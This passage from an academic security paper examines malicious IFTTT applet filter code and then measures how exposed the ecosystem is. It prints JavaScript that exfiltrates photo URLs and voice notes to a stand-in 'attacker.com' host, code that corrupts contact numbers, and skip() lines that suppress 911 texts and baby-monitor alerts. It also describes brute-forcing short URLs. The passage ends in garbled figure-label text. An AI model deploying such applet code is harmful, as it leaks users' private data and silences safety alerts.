API IosPhotos.newPhotoInCameraRoll.PublicPhotoURL for the trig-
ger “Any new photo” of iOS Photos contains the public URL of the
user’s photo on the IFTTT server. Similarly, the API GoogleDrive
.uploadFileFromUrlGoogleDrive.setUrl() for the action field “Up-
load file from URL” of Google Drive allows uploading any file from
a public URL. The attack consists of JavaScript code that passes
the photo’s public URL as parameter to the attacker’s server. We
configure the attacker’s server as a proxy to provide the user’s
photo in the response to Google Drive’s request in line 3, so that
the image is backed up as expected by the user. In our experiments,
we demonstrate the attack with a simple setup on a node.js server
that upon receiving a request of the form https://attacker.com?
https://locker.ifttt.com/img.jpeg logs the URL parameter https
://locker.ifttt.com/img.jpeg while making a request to https://
locker.ifttt.com/img.jpeg and forwarding the result as response
to the original request. Observe that the attack requires no addi-
tional user interaction because the link upload is transparently
executed by Google Drive.
1
2
3
var publicPhotoURL = encodeURIComponent (
IosPhotos . newPhotoInCameraRoll .
PublicPhotoURL )
var attack = ' https :// attacker . com ? ' +
publicPhotoURL
GoogleDrive . uploadFileFromUrlGoogleDrive .
setUrl ( attack )
Figure 2: URL upload attack exfiltrating iOS Photos
URL markup attack. Figure 3 displays a URL markup attack on
applet “Keep a list of notes to email yourself at the end of the day”.
A similar applet created by Google has currently 18,600 users [17].
The applet uses trigger “Say a phrase with a text ingredient” (cf.
trigger API GoogleAssistant.voiceTriggerWithOneTextIngredient.
TextField) from the Google Assistant service to record the user’s
voice command. Furthermore, the applet uses the action “Add to
daily email digest” from the Email Digest service (cf. action API
EmailDigest.sendDailyEmail.setMessage()) to send an email digest
with the user’s notes. For example, if the user says “OK Google, add
remember to vote on Tuesday to my digest", the applet will include
the phrase remember to vote on Tuesday as part of the user’s daily
email digest. The markup URL attack in Figure 3 creates an HTML
image tag with a link to an invisible image with the attacker’s URL
parameterized on the user’s daily notes. The exfiltration is then
executed by a web request upon processing the markup by an email
reader. In our experiments, we used Gmail to verify the attack. We
remark that the same applet can exfiltrate information through
URL uploads attacks via the EmailDigest.sendDailyEmail.setUrl()
API from the Email Digest service. In addition to email markup, we
have successfully demonstrated exfiltration via markup in Facebook
status updates and tweets. Although both Facebook and Twitter
disallow 0x0 images, they still allow small enough images, invisible
to a human, providing a channel for stealth exfiltration.
1
2
3
var notes = encodeURIComponent ( GoogleAssistant
. voiceTriggerWithOneTextIngredient .
TextField )
var img = ' '
EmailDigest . sendDailyEmail . setMessage ( ' Notes
of the day ' + notes + img )
Figure 3: URL markup attack exfiltrating daily notes
In our experiments, we verified that private information from
Google, Facebook, Twitter, iOS, Android, Location, BMW Labs, and
Dropbox services can be exfiltrated via the two URL-based classes of
attacks. Moreover, we demonstrated that these attacks apply to both
applets installed via IFTTT’s web interface and applets installed via
IFTTT’s apps on iOS and Android user devices, confirming that the
URL-based vulnerabilities are in the server-side application logic.
3.2 Integrity
We show that malicious applet makers can compromise the integrity
of the trigger and action ingredients by modifying their content via
JavaScript code in the filter API. The impact of these attacks is not
as high as that of the privacy attacks, as they compromise the data
that the user trusts an applet to access, and ultimately they can be
discovered by the user.
Figure 4 displays the malicious filter code for the applet ”Google
Contacts saved to Google Drive Spreadsheet“ which is used to back
up the list of contact numbers into a Google Spreadsheet. A similar
applet created by maker jayreddin is used by 3,900 users [31]. By
granting access to Google Contacts and Google Sheets services, the
user allows the applet to read the contact list and write customized
data to a user-defined spreadsheet. The malicious code in Figure 4
reads the name and phone number (lines 1-2) of a user’s Google
contact and randomly modifies the sixth digit of the phone number
(lines 3-4), before storing the name and the modified number to the
spreadsheet (line 5).
1
2
3
4
5
var name = GoogleContacts . newContactAdded . Name
var num = GoogleContacts . newContactAdded .
PhoneNumber
var digit = Math . floor ( Math . random () *10) + ''
var num1 = num . replace ( num . charAt (5) , digit )
GoogleSheets . appendToGoogleSpreadsheet .
setFormattedRow ( name + ' ||| '+ num1 )
Figure 4: Integrity attack altering phone numbers
Figure 5 displays a simple integrity attack on applet “When
you leave home, start recording on your Manything security cam-
era” [35]. Through it, the user configures the Manything security
camera to start recording whenever the user leaves home. This can
be done by granting access to Location and Manything services to
read the user’s location and set the security camera, respectively. A
malicious applet maker needs to write a single line of code in the
filter to force the security camera to record for only 15 minutes.
Manything . startRecording . setDuration ( '15 minutes ')
Figure 5: Altering security camera’s recording time
3.3 Availability
IFTTT provides APIs for ignoring actions altogether via skip com-
mands inside the filter code. Thus, it is possible to prevent any
applet from performing the intended action. We show that the
availability of triggers’ information through actions’ events can
be important in many contexts, and malicious applets can cause
serious damage to their users.
Consider the applet “Automatically text someone important
when you call 911 from your Android phone” by user devin with
5,100 installs [9]. The applet uses service Android Messages to text
someone whenever the user makes an emergency call. Line 4 shows
an availability attack on this applet by preventing the action from
being performed.
1
2
3
4
if ( AndroidPhone . placeAPhoneCallToNumber .
ToNumber == ' 911 ') {
AndroidMessages . sendAMessage . setText ( ' Please
help me ! ')
}
AndroidMessages . sendAMessage . skip ()
Figure 6: Availability attack on SOS text messages
As another example, consider the applet “Email me when temper-
ature drops below threshold in the baby’s room” [23]. The applet
uses the iBaby service to check whether the room temperature
drops below a user-defined threshold, and, when it does, it notifies
the user via email. The availability attack in line 7 would prevent
the user from receiving the email notification.
1
2
3
4
5
6
7
var temp = Ibaby . temperatureDrop .
TemperatureValue
var thre = Ibaby . temperatureDrop .
TemperatureThreshold
if ( temp < thre ) {
Email . sendMeEmail . setSubject ( ' Alert ')
Email . sendMeEmail . setBody ( ' Room temperature
is '+ temp )
}
Email . sendMeEmail . skip ()
Figure 7: Availability attack on baby monitors
3.4 Other IoT platforms
Zapier and Microsoft Flow are IoT platforms similar to IFTTT, in
that they also allow flows of data from one service to another.
Similarly to IFTTT, Zapier allows for specifying filter code (either
in JavaScript or Python), but, if present, the code is represented as
a separate action, so its existence may be visible to the user.
We succeeded in demonstrating the URL image markup attack
(cf. Figure 3) for a private app on test accounts on both platforms
using only the trigger’s ingredients and HTML code in the action
for specifying the body of an email message. It is worth noting that,
in contrast to IFTTT, Zapier requires a vetting process before an app
can be published on the platform. We refrained from initiating the
vetting process for an intentionally insecure app, instead focusing
on direct disclosure of vulnerabilities to the vendors.
3.5 Brute forcing short URLs
While we scrutinize IFTTT’s usage of URLs, we observe that IFTTT’s
custom URL shortening mechanism is susceptible to brute force
attacks. Recall that IFTTT automatically shortens all URLs to http
://ift.tt/ URLs in the generated markup for each user, unless
the user explicitly opts out of shortening [29]. Unfortunately, this
implies that a wealth of private information is readily available
via http://ift.tt/ URLs, such as private location maps, shared
images, documents, and spreadsheets. Georgiev and Shmatikov
point out that 6-character shortened URLs are insecure [14], and
can be easily brute-forced. While the randomized part of http://
ift.tt/ URLs is 7-character long, we observe that the majority
of the URLs generated by IFTTT have a fixed character in one of
the positions. (Patterns in shortened URLs may be used for user
tracking.) With this heuristic, we used a simple script to search
through the remaining 6-character strings yielding 2.5% success
rate on a test of 1000 requests, a devastating rate for a brute-force
attack. The long lifetime of public URLs exacerbates the problem.
While this is conceptually the simplest vulnerability we find, it
opens up for large-scale scraping of private information. For ethical
reasons, we did not inspect the content of the discovered resources
but verified that they represented a collection of links to legitimate
images and web pages. For the same reasons, we refrained to mount
large-scale demonstrations, instead reporting the vulnerability to
IFTTT. A final remark is that the shortened links are served over
HTTP, opening up for privacy and integrity attacks by the network
attacker.
Other IoT Platforms. Unlike IFTTT, Microsoft Flow does not
seem to allow for URL shortening. Zapier offers this support, but its
shortened URLs are of the form https://t.co/, served over HTTPS
and with a 10-character long randomized part.
4 MEASUREMENTS
We conduct an empirical measurement study to understand the
possible security and privacy implications of the attack vectors
from Section 3 on the IFTTT ecosystem. Drawing on (an updated
collection of) the IFTTT dataset by Mi et al. [36] from May 2017, we
study 279,828 IFTTT applets from more than 400 services against
potential privacy, integrity, and availability attacks. We first de-
scribe our dataset and methodology on publicly available IFTTT
triggers, actions and applets (Section 4.1) and propose a security
classification for trigger and action events (Section 4.2). We then
use our classification to study existing applets from the IFTTT
platform, and report on potential vulnerabilities (Section 4.3). Our
results indicate that 30% of IFTTT applets are susceptible to stealthy
privacy attacks by malicious applet makers.
4.1 Dataset and methodology
For our empirical analysis, we extend the dataset by Mi et al. [36]
from May 2017 with additional triggers and actions. The dataset
consists of three JSON files describing 1426 triggers, 891 actions,
and 279,828 applets, respectively. For each trigger, the dataset con-
tains the trigger’s title, description, and name, the trigger’s service
unique ID and URL, and a list with the trigger’s fields (i.e., parame-
ters that determine the circumstances when the trigger should go
off, and can be configured either by the applet or by the user who
enables the applet). The dataset contains similar information for the
actions. As described in Section 4.2, we enrich the trigger and action
datasets with information about the category of the correspond-
ing services (by using the main categories of services proposed
by IFTTT [27]), and the security classification of the triggers and
actions. Furthermore, for each applet, the dataset contains informa-
tion about the applet’s title, description, and URL, the developer
name and URL, number of applet installs, and the corresponding
trigger and action titles, names, and URLs, and the name, unique
ID and URL of the corresponding trigger and action service.
We use the dataset to analyze the privacy, integrity and availabil-
ity risks posed by existing public applets on the IFTTT platform.
First, we leverage the security classification of triggers and ac-
tions to estimate the different types of risks that may arise from
their potentially malicious use in IFTTT applets. Our analysis uses
Sparksoniq [44], a JSONiq [32] engine to query large-scale JSON
datasets stored (in our case) on the file system. JSONiq is an SQL-
like query and processing language specifically designed for the
JSON data model. We use the dataset to quantify on the number of
existing IFTTT applets that make use of sensitive triggers and ac-
tions. We implement our analysis in Java and use the json-simple
library [33] to parse the JSON files. The analysis is quite simple:
it scans the trigger and action files to identify trigger-action pairs
with a given security classification, and then retrieves the applets
that use such a pair. The trigger and action’s titles and unique ser-
vice IDs provide a unique identifier for a given applet in the dataset,
allowing us to count the relevant applets only once and thus avoid
repetitions.
4.2 Classifying triggers and actions
To estimate the impact of the attack vectors from Section 3 on
the IFTTT ecosystem, we inspected 1426 triggers and 891 actions,
and assigned them a security classification. The classifying process
was done manually by envisioning scenarios where the malicious
usage of such triggers and actions would enable severe security and
privacy violations. As such, our classification is just a lower bound
on the number of potential violations, and depending on the users’
preferences, finer-grained classifications are possible. For instance,
since news articles are public, we classify the trigger “New article in
section” from The New York Times service as public, although one
might envision scenarios where leaking such information would
allow an attacker to learn the user’s interests in certain topics and
hence label it as private.
Trigger classification. In our classification we use three labels
for IFTTT triggers: Private, Public, and Available. Private and Pub-
lic labels represent triggers that contain private information, e.g.,
user location and voice assistant messages, and public information,
e.g., new posts on reddit, respectively. We use label Available to
denote triggers whose content may be considered public, yet, the
mere availability of such information is important to the user. For
instance, the trigger “Someone unknown has been seen” from Ne-
tatmo Security service fires every time the security system detects
someone unknown at the device’s location. Preventing the owner of
the device from learning this information, e.g., through skip actions
in the filter code, might allow a burglar to break in the user’s house.
Therefore, this constitutes an availability violation.
Figure 8 displays the security classification for 1486 triggers (394
Private, 219 Available, and 813 Public) for 33 IFTTT categories. As
we can see, triggers labeled as Private originate from categories such
as connected car, health & fitness, social networks, task management
& to-dos, and so on. Furthermore, triggers labeled as Available fall
into different categories of IoT devices, e.g., security & monitoring
systems, smart hubs & systems, or appliances. Public labels consist
of categories such as environment control & monitoring, news &
information, or smart hubs & systems.
Action classification. Further, we use three types of security la-
bels to classify 891 actions: Public (159), Untrusted (272), and Avail-
able (460). Public labels denote actions that allow to exfiltrate infor-
mation to a malicious applet maker, e.g., through image tags and
links, as described in Section 3. Untrusted labels allow malicious
applet makers to change the integrity of the actions’ information,
e.g., by altering data to be saved to a Google Spreadsheet. Available
labels refer to applets whose action skipping affects the user in
some way.
Figure 9 presents our action classification for 35 IFTTT categories.
We remark that such information is cumulative: actions labeled
as Public are also Untrusted and Available, and actions labeled
as Untrusted are also Available. In fact, for every action labeled
Public, a malicious applet maker may leverage the filter code to
either modify the action, or block it via skip commands. Untrusted
y
r
o
g
e
t
a
c
r
e
p
s
r
e
g
g
i
r
t
f
o
r
e
b
m
u
N
y
r
o
g
e
t
a
c
r
e
p
s
n
o
i
t
c
a
f
o
r
e
b
m